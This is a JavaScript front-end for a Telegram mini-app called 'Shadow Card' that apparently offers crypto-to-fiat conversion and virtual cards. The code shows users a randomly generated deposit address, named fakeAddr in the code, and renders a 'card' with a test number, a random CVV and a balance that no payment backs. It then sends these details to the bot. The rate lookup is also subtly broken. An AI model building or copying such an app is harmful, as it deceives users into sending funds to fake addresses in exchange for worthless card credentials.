const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

const splash = document.getElementById('splash');
const app = document.getElementById('app');
const progressBar = document.querySelector('.progress-bar');
const loader = document.getElementById('loader');

// Splash
if (splash && progressBar) {
  setTimeout(() => { progressBar.style.width = '100%'; }, 100);
  setTimeout(() => {
    splash.style.opacity = '0';
    setTimeout(() => {
      splash.style.display = 'none';
      app.classList.remove('hidden');
    }, 800);
  }, 3000);
}

// Wizard
let direction = 'crypto_to_fiat';

function setDirection(dir) {
  direction = dir;
  document.getElementById('step1').classList.remove('active');
  document.getElementById('step2').classList.add('active');
  updateSourceOptions();
}

function updateSourceOptions() {
  const select = document.getElementById('source-currency');
  select.innerHTML = '';
  const options = direction === 'crypto_to_fiat' 
    ? ['BTC','ETH','USDT','SOL','TON']
    : ['USD','EUR','RUB','TRY','BRL'];
  options.forEach(opt => {
    const op = document.createElement('option');
    op.value = opt;
    op.textContent = opt;
    select.appendChild(op);
  });
}

function goToStep(step) {
  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
  document.getElementById('step' + step).classList.add('active');
}

async function updateConversion() {
  const amount = parseFloat(document.getElementById('amount').value) || 1000;
  const source = document.getElementById('source-currency').value;
  const target = direction === 'crypto_to_fiat' ? 'USD' : source.toLowerCase();

  let rate = 65000; // fallback
  try {
    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${source.toLowerCase()}&vs_currencies=usd`);
    const data = await res.json();
    rate = data[source.toLowerCase()]?.usd || rate;
  } catch (e) {
    console.error('Rate fetch failed', e);
  }

  const converted = direction === 'crypto_to_fiat' ? amount * rate : amount / rate;

  document.getElementById('conversion-info').textContent = 
    `${amount} ${source} ≈ ${converted.toFixed(2)} ${target}`;

  const fakeAddr = source + '1' + Math.random().toString(36).substring(2, 15);
  document.getElementById('deposit-address').textContent = fakeAddr;
  document.getElementById('deposit-address-container').classList.remove('hidden');
}

function simulateAndGenerate() {
  loader.classList.remove('hidden');

  setTimeout(() => {
    const amount = parseFloat(document.getElementById('amount').value);
    const source = document.getElementById('source-currency').value;
    const target = direction === 'crypto_to_fiat' ? 'USD' : 'BTC';

    const last4 = Math.floor(1000 + Math.random() * 9000);
    const expiry = '12/28';
    const cvv = Math.floor(100 + Math.random() * 900);
    const balance = direction === 'crypto_to_fiat' ? amount * 65000 : amount / 65000;

    // Рендер картинки карты
    const canvas = document.getElementById('card-canvas');
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#1a1a1a';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = 'white';
    ctx.font = 'bold 20px monospace';
    ctx.fillText('Shadow Card', 20, 40);
    ctx.font = '16px monospace';
    ctx.fillText('4111 1111 1111 ' + last4, 20, 80);
    ctx.fillText('Valid Thru ' + expiry, 20, 110);
    ctx.fillText('CVV: ' + cvv, 20, 140);
    ctx.fillText('Balance: ' + balance.toFixed(2) + ' ' + target, 20, 170);

    document.getElementById('card-result').classList.remove('hidden');
    loader.classList.add('hidden');

    // Отправляем в бот
    tg.sendData(JSON.stringify({
      action: 'create_card',
      crypto: source,
      fiat: target,
      amount,
      card_last4: last4,
      expiry,
      cvv,
      balance
    }));
  }, 2000);
}

function copyCard() {
  const text = `Card: 4111 1111 1111 ${document.getElementById('card-last4').textContent}\nExpiry: ${document.getElementById('card-expiry').textContent}\nCVV: ${document.getElementById('card-cvv').textContent}`;
  navigator.clipboard.writeText(text).then(() => tg.showAlert('Copied!'));
}

// Инициализация
updateSourceOptions();